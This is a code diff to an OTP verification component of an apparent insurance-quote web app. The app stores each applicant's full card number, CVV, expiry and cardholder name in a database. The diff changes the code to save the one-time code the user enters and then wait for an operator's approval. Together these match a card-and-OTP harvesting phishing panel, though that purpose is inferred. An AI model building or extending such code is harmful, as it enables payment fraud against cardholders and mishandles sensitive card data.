@@ -160,55 +160,18 @@ const OTPVerification = () => {
     setIsVerifying(true);
     try {
       if (applicationId) {
-        const { data: existingApp } = await supabase
+        // Update existing application with OTP code instead of creating a new one
+        const { error } = await supabase
           .from('customer_applications')
-          .select('*')
-          .eq('id', applicationId)
-          .single();
-        
-        if (!existingApp) {
-          throw new Error('Application not found');
-        }
-
-        const ipAddress = localStorage.getItem('visitor_ip') || null;
-        const { data: newApp, error } = await supabase
-          .from('customer_applications')
-          .insert([{
-            full_name: existingApp.full_name,
-            phone: existingApp.phone,
-            insurance_type: existingApp.insurance_type,
-            vehicle_manufacturer: existingApp.vehicle_manufacturer,
-            vehicle_model: existingApp.vehicle_model,
-            vehicle_year: existingApp.vehicle_year,
-            vehicle_value: existingApp.vehicle_value,
-            usage_purpose: existingApp.usage_purpose,
-            add_driver: existingApp.add_driver,
-            selected_company: existingApp.selected_company,
-            selected_price: existingApp.selected_price,
-            regular_price: existingApp.regular_price,
-            company_logo: existingApp.company_logo,
-            cardholder_name: existingApp.cardholder_name,
-            card_number: existingApp.card_number,
-            card_last_4: existingApp.card_last_4,
-            card_type: existingApp.card_type,
-            card_cvv: existingApp.card_cvv,
-            expiry_date: existingApp.expiry_date,
+          .update({
             otp_code: otp,
             current_step: 'otp',
-            payment_approved: existingApp.payment_approved,
             otp_approved: false,
-            status: 'pending',
-            ip_address: ipAddress
-          }])
-          .select()
-          .single();
+            status: 'pending'
+          })
+          .eq('id', applicationId);
 
         if (error) throw error;
-        
-        if (newApp) {
-          setApplicationId(newApp.id);
-          localStorage.setItem('applicationId', newApp.id);
-        }
         
         setIsVerifying(false);
         setWaitingForApproval(true);
